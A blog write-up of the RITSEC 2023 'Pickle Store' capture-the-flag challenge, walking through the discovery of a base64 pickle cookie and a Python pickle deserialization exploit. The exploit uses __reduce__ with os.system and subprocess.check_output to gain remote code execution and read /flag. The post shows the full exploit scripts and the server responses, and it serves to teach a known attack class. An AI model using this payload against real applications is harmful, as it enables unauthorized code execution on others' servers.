---
layout: post
title:  RITSEC 2023 - Web / Pickle Store
summary: 'Writeup for RITSEC 2023 "Pickle Store" Challenge'
author: leo
date: '2023-04-02 00:00:00 -0400'
category: ritsec-ctf-2023
thumbnail: /assets/img/posts/ritsec-ctf-2023/logo.png
include_thumbnail: false
keywords: security, ctf, ritsec
permalink: /blog/ritsec-ctf-2023/web/pickle-store
usemathjax: true
---

# The Challenge
You are led to a website that has a bunch of pickles for sale.  Clicking on a pickle brings you to the `/order` page, where it tells you your order.  This one was released well after the start of CTF, and I had already done the [X-Men Lore challenge](/blog/ritsec-ctf-2023/web/x-men-lore), and it seemed _very_ familiar. 

## Cookies On Click
Similar to how the x-men challenge worked, the buttons were embedded into a link, but also had an on-click handler that set a cookie.  The full onclick function for "Sweet Pickle" is 
```javascript
document.cookie="order=gASVDwAAAAAAAACMC3N3ZWV0cGlja2xllC4="
```

That looks like some base64 if I've ever seen it!  Pro-tip from future leo: Don't rely on the chrome dev tools or even the terminal, as there could be some extra un-readable characters in the data.  Given this has the name "Pickle" in the title, and we know it's a `gunicorn` server (inspect the response headers for the website), we already know it's a python deserialization exercise.  Python pickles are binary data, not strings.  I wasted a bit of time here.

## Creating a Payload
Like any great security researcher, I googled "python pickle exploit" and copy/pasted the code.  I would then create a pickle from my exploit, and then base64 encode it.  My PoC code looked like this:

```python
import base64
import os
import pickle
import requests

class SweetPickle:
    def __reduce__(self):
        return (os.system, ('id',))


def main():
    url = 'https://pickles-web.challenges.ctf.ritsec.club/order'
    cookie = { 'order': base64.b64encode(pickle.dumps(SweetPickle())).decode() }
    res = requests.get(url, cookies=cookie)
    print(res.text)

if __name__ == '__main__':
    main()

```

And the response:
```html
<!DOCTYPE html>
<head>
  <title>Pickle Store</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>
  <h1>Here's your order!</h1>
  <h2>0</h2>
  <a class='button' href='/'>New Order</a>
</body>
```

## Not Quite There
We know that we proved it was vulnerable to a pickle deserialization attack, but we aren't really able to do a lot with the output from our payload.  I spent a little time enumerating what was causing the `0` where the name should be, and finally realized that's the response code from the `os.system` call.  We don't want the response code, we want actual output.  More googling and a little refactoring later, I had the following:

```python
import base64
import pickle
import requests
import subprocess

class SweetPickle:
    def __reduce__(self):
        return (subprocess.check_output,('id',))


def main():
    url = 'https://pickles-web.challenges.ctf.ritsec.club/order'
    cookie = { 'order': base64.b64encode(pickle.dumps(SweetPickle())).decode() }
    res = requests.get(url, cookies=cookie)
    print(res.text)

if __name__ == '__main__':
    main()
```

Which then returned:
```html
<!DOCTYPE html>
<head>
  <title>Pickle Store</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>
  <h1>Here's your order!</h1>
  <h2>b&#39;uid=1000(user) gid=1000(user) groups=1000(user)\n&#39;</h2>
  <a class='button' href='/'>New Order</a>
</body>
```

We now have our remote code execution, and we can find the flag.  As with x-men, the flag is located at `/flag`.  All we have to do is change the second argument to the return in our reduce function.  Full code below:
```python
import base64
import pickle
import requests
import subprocess

class SweetPickle:
    def __reduce__(self):
        return (subprocess.check_output,(['cat', '/flag'],))


def main():
    url = 'https://pickles-web.challenges.ctf.ritsec.club/order'
    cookie = { 'order': base64.b64encode(pickle.dumps(SweetPickle())).decode() }
    res = requests.get(url, cookies=cookie)
    print(res.text)

if __name__ == '__main__':
    main()

```

# Conclusion
Encoding issues using the browser's console to base64decode the cookie value sent me down a weird rabbit hole.  It was only showing me the text of the class name, but not the un-readable characters.  I SHOULD have known it was binary data, but I overlooked it and wasted about 20 minutes on that.  Lesson learned!!!! 
